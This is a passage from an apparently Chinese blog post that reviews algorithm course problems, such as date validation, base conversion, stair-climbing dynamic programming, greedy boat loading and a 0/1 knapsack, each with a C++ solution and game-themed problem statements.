class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a, a + n);</span><br><span class="line">    sort(b, b + n, cmp);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = <span class="built_in">abs</span>(b[i] - a[i]);</span><br><span class="line">        sum += temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="判断日期是否符合格式"><a href="#判断日期是否符合格式" class="headerlink" title="判断日期是否符合格式"></a>判断日期是否符合格式</h3><h5 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h5><p>我们知道一年有12个月，每个月最多有31天，年有平年和闰年之分，本题目要求如果输入一个日期，程序需要判断用户输入的日期是否正确。</p>
<p>提示：测试输入的三个数字中，年份是正数，月份和日期有可能是负数，程序需要对这两个数为负数的情况进行判断。</p>
<h5 id="输入-17"><a href="#输入-17" class="headerlink" title="输入"></a>输入</h5><p>多组测试用例，对每组测试用例：</p>
<p>用户输入是三个数字，分别表示年，月和日。 例如 2007 10 21 ，表示2007年10月21日，这个输入经过判断是正确的。又例如输入 1993 11 38 ，这个输入经过判断是错误的，因为日期不能超过31天。</p>
<h5 id="输出-17"><a href="#输出-17" class="headerlink" title="输出"></a>输出</h5><p>程序的输出分为两种，1或者0。1表示输入正确，0表示输入错误。</p>
<h5 id="样例输入-17"><a href="#样例输入-17" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">2011 </span><span class="number">21</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-17"><a href="#样例输出-17" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h5><p>闰年判断：（能被4整除<code>&amp;&amp;</code>不能被100整除）<code>||</code>能被400整除<br>其他没啥好说的，开一个大小为12的数组<code>month[12]</code>，存每个月的天数，如果是闰年的话就将<code>month[1]</code>加1</p>
<h5 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Judge</span><span class="params">(<span class="keyword">int</span> year)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>) || year % <span class="number">400</span> == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> y, m, d;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; y &gt;&gt; m &gt;&gt; d)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> month[<span class="number">12</span>] = &#123;<span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line">		<span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (Judge(y))</span><br><span class="line">			month[<span class="number">1</span>]++;</span><br><span class="line">		<span class="keyword">if</span> (m &gt; <span class="number">0</span> &amp;&amp; m &lt;= <span class="number">12</span> &amp;&amp; d &gt; <span class="number">0</span> &amp;&amp; d &lt;= month[m - <span class="number">1</span>])</span><br><span class="line">			flag = <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; flag &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><h5 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h5><p>输入一个十进制正整数，然后输出它所对应的八进制数。</p>
<h5 id="输入-18"><a href="#输入-18" class="headerlink" title="输入"></a>输入</h5><p>输入一个十进制正整数n(1≤n≤106) 。</p>
<h5 id="输出-18"><a href="#输出-18" class="headerlink" title="输出"></a>输出</h5><p>输出n对应的八进制数，输出在一行。</p>
<h5 id="样例输入-18"><a href="#样例输入-18" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-18"><a href="#样例输出-18" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<h5 id="代码-13"><a href="#代码-13" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> r[<span class="number">100000</span>];</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        r[count++] = x % <span class="number">8</span>;</span><br><span class="line">        x = x / <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//倒序输出</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = count - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; r[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h1 id="16级考试题目"><a href="#16级考试题目" class="headerlink" title="16级考试题目"></a>16级考试题目</h1><p><br></p>
<h3 id="问题-A-星空梦想——鲁班"><a href="#问题-A-星空梦想——鲁班" class="headerlink" title="问题 A: 星空梦想——鲁班"></a>问题 A: 星空梦想——鲁班</h3><h5 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h5><p>鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。</p>
<p>既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？</p>
<h5 id="输入-19"><a href="#输入-19" class="headerlink" title="输入"></a>输入</h5><p>多组测试用例。</p>
<p>第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。</p>
<p>接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。</p>
<h5 id="输出-19"><a href="#输出-19" class="headerlink" title="输出"></a>输出</h5><p>每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。</p>
<h5 id="样例输入-19"><a href="#样例输入-19" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">50</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-19"><a href="#样例输出-19" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">20365011074</span></span><br></pre></td></tr></table></figure>
<h5 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h5><p>注意结果超过int范围，请用long long类型存储ans</p>
<h5 id="思路-16"><a href="#思路-16" class="headerlink" title="思路"></a>思路</h5><p>思路一：递归法+打表</p>
<p>思路二：动态规划</p>
<p>用<code>dp[i]</code>表示跳到第<code>i</code>级台阶的方法数，则<code>dp[1]=1</code>、<code>dp[2]=2</code> … <code>dp[i]=dp[i-1]+dp[i-2]</code>，即到第<code>i</code>级台阶的最后一步可以选择跳1级，也可以选择跳2级，而这两种方法的结果我们已经由动态规划得到，直接相加即可。</p>
<h5 id="代码-14"><a href="#代码-14" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">55</span>;</span><br><span class="line">ll dp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; dp[n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-B-午夜歌剧——元歌"><a href="#问题-B-午夜歌剧——元歌" class="headerlink" title="问题 B: 午夜歌剧——元歌"></a>问题 B: 午夜歌剧——元歌</h3><h5 id="题目描述-20"><a href="#题目描述-20" class="headerlink" title="题目描述"></a>题目描述</h5><p>元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。</p>
<p>是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。</p>
<p>等式1：</p>
<p><img src="/2019/10/28/algorithm-experiment-review/20191027213057986.png" alt="在这里插入图片描述"></p>
<p>等式2：</p>
<p><img src="/2019/10/28/algorithm-experiment-review/20191027213105615.png" alt="在这里插入图片描述"></p>
<h5 id="输入-20"><a href="#输入-20" class="headerlink" title="输入"></a>输入</h5><p>多组测试用例。</p>
<p>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p>
<p>接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。</p>
<h5 id="输出-20"><a href="#输出-20" class="headerlink" title="输出"></a>输出</h5><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。</p>
<h5 id="样例输入-20"><a href="#样例输入-20" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">1433223</span></span><br><span class="line"><span class="number">193224</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-20"><a href="#样例输出-20" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">15116331</span></span><br><span class="line"><span class="number">1433223</span></span><br></pre></td></tr></table></figure>
<h5 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h5><p>测试数据均大于等于1，不用特判0</p>
<h5 id="思路-17"><a href="#思路-17" class="headerlink" title="思路"></a>思路</h5><p>其实就是10进制转7进制</p>
<h5 id="代码-15"><a href="#代码-15" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e8</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">convert</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c, r;</span><br><span class="line">    r = n % <span class="number">7</span>;</span><br><span class="line">    c = n / <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span> (c &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        convert(c);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        convert(n);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="圣诞恋歌——貂蝉"><a href="#圣诞恋歌——貂蝉" class="headerlink" title="圣诞恋歌——貂蝉"></a>圣诞恋歌——貂蝉</h3><h5 id="题目描述-21"><a href="#题目描述-21" class="headerlink" title="题目描述"></a>题目描述</h5><p>貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。<br>我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。<br>现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。</p>
<h5 id="输入-21"><a href="#输入-21" class="headerlink" title="输入"></a>输入</h5><p>多组测试数据，第一行输入包含一个整数T，代表测试样例个数。<br>接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。</p>
<h5 id="输出-21"><a href="#输出-21" class="headerlink" title="输出"></a>输出</h5><p>每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。</p>
<h5 id="样例输入-21"><a href="#样例输入-21" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">81</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-21"><a href="#样例输出-21" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">121</span></span><br></pre></td></tr></table></figure>
<h5 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h5><p>没思路，喝瓶汽水冷静下？</p>
<h5 id="思路-18"><a href="#思路-18" class="headerlink" title="思路"></a>思路</h5><p>每次攻击<code>ans++</code>，攻击次数<code>n--</code>，<code>count</code>来记录攻击的次数，每攻击3次<code>（count==3）</code>，则攻击次数加1（白送一次），同时将count清0，知道所剩攻击次数为0，停止。</p>
<h5 id="代码-16"><a href="#代码-16" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="comment">//每3次攻击,就多一次攻击</span></span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">3</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                n++;</span><br><span class="line">                count = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ans += <span class="number">1</span>;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-D-海之征途——孙策"><a href="#问题-D-海之征途——孙策" class="headerlink" title="问题 D: 海之征途——孙策"></a>问题 D: 海之征途——孙策</h3><h5 id="题目描述-22"><a href="#题目描述-22" class="headerlink" title="题目描述"></a>题目描述</h5><p>孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。</p>
<p>现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。</p>
<h5 id="输入-22"><a href="#输入-22" class="headerlink" title="输入"></a>输入</h5><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p>
<p>每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。</p>
<h5 id="输出-22"><a href="#输出-22" class="headerlink" title="输出"></a>输出</h5><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。</p>
<h5 id="样例输入-22"><a href="#样例输入-22" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="symbol">10 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">5</span> <span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">20 </span><span class="number">9</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">5</span> <span class="number">2</span> <span class="number">4</span> <span class="number">6</span> <span class="number">1</span> <span class="number">8</span> <span class="number">5</span> <span class="number">9</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-22"><a href="#样例输出-22" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>
<h5 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h5><p>1.小朋友的体重可能相同 2.船可以满载</p>
<h5 id="思路-19"><a href="#思路-19" class="headerlink" title="思路"></a>思路</h5><p>贪心算法，先对小朋友按体重升序排列，然后体重小的优先上船，直到容量满为止。</p>
<h5 id="代码-17"><a href="#代码-17" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="keyword">int</span> t, m, n;</span><br><span class="line"><span class="keyword">int</span> w[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; w[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(w, w + n);</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>, c = m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (w[i] &lt;= c)</span><br><span class="line">            &#123;</span><br><span class="line">                ans++;</span><br><span class="line">                c -= w[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-E-极冰防御——盾山"><a href="#问题-E-极冰防御——盾山" class="headerlink" title="问题 E: 极冰防御——盾山"></a>问题 E: 极冰防御——盾山</h3><h5 id="题目描述-23"><a href="#题目描述-23" class="headerlink" title="题目描述"></a>题目描述</h5><p>盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。</p>
<p>盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。</p>
<p>假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？</p>
<h5 id="输入-23"><a href="#输入-23" class="headerlink" title="输入"></a>输入</h5><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。</p>
<p>接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。</p>
<h5 id="输出-23"><a href="#输出-23" class="headerlink" title="输出"></a>输出</h5><p>每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。</p>
<h5 id="样例输入-23"><a href="#样例输入-23" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="symbol">10 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">6</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">6</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-23"><a href="#样例输出-23" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure>
<h5 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h5><p>结果可能超过int范围，请使用long long类型变量</p>
<h5 id="思路-20"><a href="#思路-20" class="headerlink" title="思路"></a>思路</h5><p>说了这么多，其实就是经典的01背包问题。</p>
<p>之前有一道01背包用<code>cin/cout</code>过不了，只能用<code>scanf/printf</code>，所以到时候看情况吧..</p>
<h5 id="代码-18"><a href="#代码-18" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">10005</span>;</span><br><span class="line">ll dp[maxn][maxn];</span><br><span class="line">ll w[maxn], p[maxn];</span><br><span class="line">ll c, n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="comment">//scanf("%d", &amp;t);</span></span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; c &gt;&gt; n;</span><br><span class="line">        <span class="comment">//scanf("%lld %lld", &amp;c, &amp;n);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; w[i] &gt;&gt; p[i];</span><br><span class="line">            <span class="comment">//scanf("%lld %lld", &amp;w[i], &amp;p[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line">        ll jMax = min(w[n] - <span class="number">1</span>, c);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">            dp[n][j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = w[n]; j &lt;= c; j++)</span><br><span class="line">            dp[n][j] = 